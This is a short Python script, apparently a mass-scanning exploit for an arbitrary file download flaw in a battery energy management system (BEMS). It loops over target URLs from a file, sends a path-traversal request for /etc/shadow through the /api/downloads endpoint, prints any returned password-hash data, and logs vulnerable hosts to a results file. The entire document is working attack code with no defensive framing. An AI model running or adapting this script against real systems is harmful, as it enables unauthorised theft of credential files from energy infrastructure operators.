import requests

for url in open("电池能量管理系统.txt"):
	try:
		url = url.replace("\n", "")
		print(url+"检测中----\n\n")
		jiaoyan = requests.get(url+"/api/downloads?fileName=../../../../../../../../etc/shadow", timeout=5)
		if ("root:*:" in jiaoyan.text) and (jiaoyan.status_code == 200):
			print(jiaoyan.text)
			with open("龙璟科技 电池能量管理系统 BEMS download 任意文件下载 vul.txt", "a+") as f:
				f.write(url + "\n")
		else:
			print(url+"不存在漏洞\n")
	except:
		continue

